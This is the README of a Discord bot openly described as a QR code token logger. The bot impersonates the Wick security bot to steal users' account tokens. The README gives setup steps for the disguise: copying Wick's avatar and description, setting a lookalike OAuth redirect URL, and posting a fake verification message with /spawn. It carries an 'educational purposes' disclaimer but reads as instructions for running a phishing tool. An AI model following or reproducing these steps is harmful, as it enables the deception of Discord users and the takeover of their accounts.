<h1 align="center">Discord QR Code Token Logger</h1>
<h3 align="center">Discord Bot that impersonates Wick Bot to steal tokens!</h3>

## Features
- **Looks exactly like Wick Bot.**
- **Memory Efficient.** (doesn't use chromedriver.exe or any browser)

## Disclaimers
- This is a bot that is not affiliated with any of the Discord or Discord Inc. teams.
- This was made for educational purposes. It is not meant to be used for malicious purposes.
- Any use of this bot is at your own risk. I am not responsible for any damage that may occur.

## Setup
- **Create a new Discord Bot**
    - Add ```https://wickbot.com/wauth/callback``` to the redirect urls in the OAuth2 section of the bot's settings.
    - Change bot's profile picture to [wick.png](https://github.com/ulnk/scam/blob/main/wick.png).
    - Change bot's description to 
        - ```Discord Security Bot made to protect servers from raids, nukes and more things! https://wickbot.com/ ```

- STARTUP BOT
    - **AFTER CONFIG BOT RUN FILE "wick-start"**
    - **TO SPAWN VERIFY MESSAGE USE /SPAWN**


### Libraries Used
* **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
* **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
* **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
* **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
